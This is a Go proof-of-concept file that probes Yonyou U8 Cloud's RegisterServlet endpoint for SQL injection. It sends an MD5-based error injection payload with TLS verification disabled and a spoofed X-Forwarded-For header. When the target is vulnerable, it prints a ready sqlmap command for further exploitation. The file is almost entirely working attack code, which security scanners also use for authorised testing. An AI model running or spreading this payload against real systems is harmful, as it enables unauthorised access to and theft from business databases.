package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func U8CloudRegisterServletSQLi(target string) {
	url := strings.TrimRight(target, "/")
	data := "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','12138')),3,32)>0--"
	req, err := http.NewRequest("POST", url+"/servlet/RegisterServlet", bytes.NewBufferString(data))
	if err != nil {
		log.Println(err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-Forwarded-For", "127.0.0.1")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	tag := regexp.MustCompile("4163634d39ec5b1d3e126f44619243b2").MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在用友 U8 Cloud RegisterServlet SQL注入漏洞")
		log.Println("[+] sqlmap命令：sqlmap.py -u \"" + url + "/servlet/RegisterServlet" + "\" --data \"usercode=1\" --random-agent --hex")
	} else {
		log.Println("[-] 不存在用友 U8 Cloud RegisterServlet SQL注入漏洞")
	}
}
